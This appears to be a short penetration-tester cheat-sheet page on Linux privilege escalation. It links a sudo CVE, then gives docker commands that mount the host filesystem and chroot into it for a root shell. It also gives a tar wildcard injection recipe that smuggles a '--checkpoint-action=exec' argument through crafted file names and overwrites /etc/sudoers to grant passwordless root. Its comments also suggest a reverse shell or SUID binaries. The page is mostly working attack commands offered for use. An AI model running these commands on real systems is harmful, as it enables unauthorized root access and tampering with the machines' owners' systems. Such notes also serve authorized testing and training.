# Interesting Findings

## Sudo CVE

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption><p>sudo <a href="https://access.redhat.com/security/cve/cve-2019-14287">CVE-2019-14287</a></p></figcaption></figure>

Read more: [https://www.mend.io/blog/new-vulnerability-in-sudo-cve-2019-14287/](https://www.mend.io/blog/new-vulnerability-in-sudo-cve-2019-14287/)

## Docker

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/bash
```

Docker shell bypass and privesc to root

```bash
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```

## Tar Wildcard

```bash
# 1. Create files in the current directory called
# '--checkpoint=1' and '--checkpoint-action=exec=sh privesc.sh'

echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh privesc.sh'

# 2. Create a privesc.sh bash script, that allows for privilege escalation
#malicous.sh:
echo 'kali ALL=(root) NOPASSWD: ALL' > /etc/sudoers

#The above injects an entry into the /etc/sudoers file that allows the 'kali' 
#user to use sudo without a password for all commands
#NOTE: we could have also used a reverse shell, this would work the same!
#OR: Even more creative, you could've used chmod to changes the permissions
#on a binary to have SUID permissions, and PE that way
```

